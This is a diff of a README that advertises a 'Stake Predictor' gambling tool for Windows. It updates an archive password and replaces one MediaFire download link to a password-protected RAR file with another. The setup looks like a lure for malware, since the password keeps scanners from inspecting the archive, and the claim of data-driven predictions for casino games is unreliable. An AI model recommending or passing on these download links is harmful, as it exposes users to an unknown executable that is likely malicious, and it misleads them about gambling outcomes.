@@ -15,8 +15,8 @@ Start Predicting: Use the tool to make data-driven predictions and enhance your 
 Monitor Results: Track your performance and refine your strategies based on the insights provided.
 Requirement: Windows
 
-Pass: 1234
+Pass: 12345
 
 Requirement: Windows
 
-[Download the Latest Version](https://www.mediafire.com/file/goldkidbr10bqmz/Stake_Predictor.rar/file) 
+[Download the Latest Version](https://www.mediafire.com/file/irzd336itkebb3q/Stake_Predictor.rar/file) 
